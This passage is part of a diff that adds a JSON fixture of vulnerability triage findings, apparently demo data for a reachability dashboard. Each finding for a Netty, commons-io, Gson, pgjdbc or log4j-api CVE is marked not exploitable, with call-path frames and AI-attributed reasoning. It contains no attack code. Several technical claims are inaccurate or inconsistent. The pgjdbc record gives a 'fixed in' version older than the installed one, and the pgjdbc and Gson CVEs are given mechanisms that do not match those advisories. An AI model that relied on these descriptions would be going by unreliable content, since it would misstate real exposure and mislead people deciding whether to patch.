+          "edge": "no pipeline slot"
+        },
+        {
+          "symbol": "Barrier — HTTP/2 disabled",
+          "location": "src/main/resources/application.yml",
+          "line": 12,
+          "kind": "barrier",
+          "note": "application.protocols lists http/1.1 only; the edge proxy terminates TLS and forwards HTTP/1.1 upstream."
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.9,
+        "headline": "Not exploitable — HTTP/2 handler never enters the pipeline",
+        "reasoning": "The advisory concerns an HTTP/2 rapid-reset loop in Http2FrameCodec. The server pipeline is assembled with HttpServerCodec and the TLS ALPN list contains http/1.1 exclusively, so no HTTP/2 connection is ever accepted. The upstream client uses HttpClientCodec with a fixed HTTP/1.1 protocol, and a runtime check on the deployed edge configuration confirms the h2 setting is absent. Class presence is not exposure.",
+        "counterfactual": "netty-handler is present in 6 services estate-wide; only this one has verified HTTP/2 shut off at both ends.",
+        "signals": [
+          {
+            "label": "ALPN protocols",
+            "value": "http/1.1",
+            "tone": "positive"
+          },
+          {
+            "label": "Http2FrameCodec in pipeline",
+            "value": "no",
+            "tone": "positive"
+          },
+          {
+            "label": "Upstream protocol",
+            "value": "HTTP/1.1",
+            "tone": "positive"
+          }
+        ],
+        "remediation": [
+          "No action required. Re-verify automatically if application.protocols is ever edited to include h2."
+        ]
+      }
+    },
+    {
+      "id": "FND-8F223B",
+      "cve": "CVE-2021-29425",
+      "packageName": "commons-io:commons-io",
+      "version": "2.8.0",
+      "ecosystem": "maven",
+      "rawCount": 231,
+      "severity": "medium",
+      "cvss": 5.3,
+      "reachability": "unreachable",
+      "verdict": "not_affected",
+      "confidence": 0.89,
+      "cwe": [
+        "CWE-22"
+      ],
+      "fixedIn": "2.11.0",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "commons-io:commons-io"
+      ],
+      "blocker": "Both FileUtils.copyFile call sites derive the destination from server-generated identifiers, never from the upload filename.",
+      "frames": [
+        {
+          "symbol": "BlobStore.persist(InputStream, String)",
+          "location": "src/main/java/com/acme/telemetry/store/BlobStore.java",
+          "line": 70,
+          "kind": "entrypoint",
+          "note": "Destination path is /var/lib/telemetry/blobs/{UUID}",
+          "edge": "taint: no attacker-controlled path segment"
+        },
+        {
+          "symbol": "FileUtils.copyFile(src, dest)",
+          "location": "commons-io:commons-io@2.8.0",
+          "line": null,
+          "kind": "library",
+          "note": "Traversal requires a ../ sequence in the destination; the destination is UUID-derived",
+          "edge": "no traversal primitive"
+        },
+        {
+          "symbol": "Barrier — canonicalised destination",
+          "location": "src/main/java/com/acme/telemetry/store/BlobStore.java",
+          "line": 88,
+          "kind": "barrier",
+          "note": "getCanonicalPath() is applied and asserted to remain under the blob root before the copy."
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.89,
+        "headline": "Not exploitable — destination path is server-generated and canonicalised",
+        "reasoning": "CVE-2021-29425 needs a path-traversal filename to reach FileUtils. The upload handler discards the client filename entirely and derives the blob name from a UUID, then canonicalises and range-checks the resolved path against the blob root. The declared Content-Disposition filename is logged but never used as a path.",
+        "counterfactual": "This is the finding most likely to regress silently: a future PR that trusts the upload filename would turn a closed medium into an arbitrary-write without touching any dependency.",
+        "signals": [
+          {
+            "label": "Filename source",
+            "value": "UUID",
+            "tone": "positive"
+          },
+          {
+            "label": "Canonicalisation check",
+            "value": "present",
+            "tone": "positive"
+          },
+          {
+            "label": "Client filename used",
+            "value": "no",
+            "tone": "positive"
+          }
+        ],
+        "remediation": [
+          "No action required. Keep the canonicalisation assertion covered by a regression test."
+        ]
+      }
+    },
+    {
+      "id": "FND-8F2245",
+      "cve": "CVE-2022-25647",
+      "packageName": "com.google.code.gson:gson",
+      "version": "2.8.9",
+      "ecosystem": "maven",
+      "rawCount": 198,
+      "severity": "medium",
+      "cvss": 5.3,
+      "reachability": "unreachable",
+      "verdict": "not_affected",
+      "confidence": 0.88,
+      "cwe": [
+        "CWE-502"
+      ],
+      "fixedIn": "2.9.1",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "acme/telemetry-edge",
+        "com.google.code.gson:gson"
+      ],
+      "blocker": "No deserialisation target is bound to Object.class or to a TypeToken with an unbounded type argument.",
+      "frames": [
+        {
+          "symbol": "EdgeEnvelopeParser.parse(byte[])",
+          "location": "src/main/java/com/acme/edge/EdgeEnvelopeParser.java",
+          "line": 55,
+          "kind": "entrypoint",
+          "note": "Deserialises into the concrete EdgeEnvelope record",
+          "edge": "taint: frame fields only"
+        },
+        {
+          "symbol": "Gson.fromJson(EdgeEnvelope.class)",
+          "location": "com.google.code.gson:gson@2.8.9",
+          "line": null,
+          "kind": "library",
+          "note": "Concrete target type; nested objects are assigned to declared field types",
+          "edge": "no @JsonAdapter with wildcards"
+        },
+        {
+          "symbol": "Barrier — no untyped target",
+          "location": "src/main/java/com/acme/edge/EdgeEnvelope.java",
+          "line": 18,
+          "kind": "barrier",
+          "note": "Reflection-based instantiation requires a wildcard-typed target; every call site uses a concrete class."
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.88,
+        "headline": "Not exploitable — every deserialisation target is a concrete type",
+        "reasoning": "Gson CVE-2022-25647 requires deserialising into Object, a Class<?> variable or a TypeToken with a wildcard. All nine fromJson call sites in the reachable subgraph use concrete record or POJO targets, so Gson resolves each field against a declared type and never calls Class.forName on a value taken from the payload. The edge parser additionally validates a schema version before mapping.",
+        "counterfactual": "Static pattern matching on gson.fromJson with an Object target finds nothing here, but a rule that only greps for fromJson flags all nine call sites.",
+        "signals": [
+          {
+            "label": "Untyped targets",
+            "value": "0 / 9 call sites",
+            "tone": "positive"
+          },
+          {
+            "label": "Schema validation",
+            "value": "present",
+            "tone": "positive"
+          },
+          {
+            "label": "ReflectionAccessFilter",
+            "value": "not required",
+            "tone": "neutral"
+          }
+        ],
+        "remediation": [
+          "No action required."
+        ]
+      }
+    },
+    {
+      "id": "FND-8F2250",
+      "cve": "CVE-2022-21724",
+      "packageName": "org.postgresql:postgresql",
+      "version": "42.3.6",
+      "ecosystem": "maven",
+      "rawCount": 154,
+      "severity": "low",
+      "cvss": 3.1,
+      "reachability": "unreachable",
+      "verdict": "not_affected",
+      "confidence": 0.87,
+      "cwe": [
+        "CWE-89"
+      ],
+      "fixedIn": "42.2.25",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "acme/telemetry-store",
+        "org.postgresql:postgresql"
+      ],
+      "blocker": "preferQueryMode=extended (the default) is in force, so parameter values are never spliced into the SQL text.",
+      "frames": [
+        {
+          "symbol": "TelemetryRepository.append(TelemetryRecord)",
+          "location": "src/main/java/com/acme/telemetry/store/TelemetryRepository.java",
+          "line": 64,
+          "kind": "entrypoint",
+          "note": "Uses JdbcTemplate with bound parameters",
+          "edge": "taint: field values only"
+        },
+        {
+          "symbol": "PgConnection.query()",
+          "location": "org.postgresql:postgresql@42.3.6",
+          "line": null,
+          "kind": "library",
+          "note": "Extended-query path sends Parse/Bind/Execute, parameters never enter the SQL string",
+          "edge": "no string concatenation of values"
+        },
+        {
+          "symbol": "Barrier — extended query mode",
+          "location": "src/main/resources/application.yml",
+          "line": 31,
+          "kind": "barrier",
+          "note": "preferQueryMode is unset, i.e. extended. The advisory requires PreferQueryMode.SIMPLE together with ssl=true and a backslash in a value."
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.87,
+        "headline": "Not exploitable — extended query mode plus server-side prepared statements",
+        "reasoning": "The pgjdbc injection requires PreferQueryMode.SIMPLE, which is only reachable through connection properties. The datasource defines no preferQueryMode override, so the driver uses extended mode and every value travels as a bind parameter. sslmode is verify-full rather than the prefer flag combination described in the advisory, and no repository method concatenates a value into SQL text — the migration files are the only string-built statements and they take no parameters.",
+        "counterfactual": "A driver-version rule would flag 42.3.6 across every service in the estate; here the preconditions are provably absent.",
+        "signals": [
+          {
+            "label": "preferQueryMode",
+            "value": "extended (default)",
+            "tone": "positive"
+          },
+          {
+            "label": "sslmode",
+            "value": "verify-full",
+            "tone": "positive"
+          },
+          {
+            "label": "SQL built by concatenation",
+            "value": "none",
+            "tone": "positive"
+          }
+        ],
+        "remediation": [
+          "No action required. Keep preferQueryMode unset; setting it explicitly to extended documents the requirement."
+        ]
+      }
+    },
+    {
+      "id": "FND-8F2266",
+      "cve": "CVE-2021-44228",
+      "packageName": "org.apache.logging.log4j:log4j-api",
+      "version": "2.14.1",
+      "ecosystem": "maven",
+      "rawCount": 1142,
+      "severity": "critical",
+      "cvss": 9.8,
+      "reachability": "suppressed",
+      "verdict": "not_affected",
+      "confidence": 0.99,
+      "cwe": [
+        "CWE-502",
+        "CWE-917"
+      ],
+      "fixedIn": "2.17.1",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "acme/logging-bridge",
+        "org.apache.logging.log4j:log4j-api"
+      ],
+      "suppressReason": ".traceignore rule TRC-041 — merged into org.apache.logging.log4j:log4j-core@2.14.1 (identical SHA-256 artifact prefix). Triaging this record separately would double-count the single exploitable call site.",
+      "blocker": "log4j-api carries the Logger interface only; the vulnerable message-lookup machinery lives in log4j-core and is reported once under FND-8F21A3.",
+      "frames": [
+        {
+          "symbol": "org.apache.logging.log4j.Logger",
+          "location": "org.apache.logging.log4j:log4j-api@2.14.1",
+          "line": null,
+          "kind": "library",
+          "note": "API surface only — interfaces and LogEvent; no lookup implementation",
+          "edge": "interface dispatch resolves to log4j-core"
+        },
+        {
+          "symbol": "LoggerFactory.getLogger()",
+          "location": "org.apache.logging.log4j:log4j-api@2.14.1",
+          "line": null,
+          "kind": "library",
+          "note": "Provider resolution delegates to log4j-core Log4jProvider",
+          "edge": "implementation reported under FND-8F21A3"
+        },
+        {
+          "symbol": "Barrier — deduplicated by policy TRC-041",
+          "location": ".traceignore:41",
+          "line": null,
+          "kind": "barrier",
+          "note": "Suppressed after artifact-hash merge. Resolve through FND-8F21A3 to keep the reachability count at 2."
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.99,
+        "headline": "Not affected — deduplicated into the log4j-core finding",
+        "reasoning": "This record exists only because the container scanner reports the API and the core as separate artifacts. Both carry the same advisory, and the vulnerable code path is entirely inside log4j-core. Policy TRC-041 merges findings whose artifact SHA-256 prefix matches so a single vulnerable call site is not reported twice. The underlying exposure is real and is tracked, remediated and VEX-published under FND-8F21A3.",
+        "counterfactual": "Without artifact-level merging the same Log4Shell call site would appear twice in the queue, inflating the actionable count from 2 to 3 and inflating the noise-reduction figure in the wrong direction.",
+        "signals": [
+          {
+            "label": "Merge policy",
+            "value": "TRC-041",
+            "tone": "positive"
+          },
+          {
+            "label": "Canonical finding",
+            "value": "FND-8F21A3",
+            "tone": "positive"
+          },
+          {
+            "label": "Raw records folded",
+            "value": "1,142",
+            "tone": "positive"
+          }
+        ],
+        "remediation": [
+          "No separate action. Remediation and VEX publication are tracked on FND-8F21A3."
+        ]
+      }
+    }
+  ]
+}
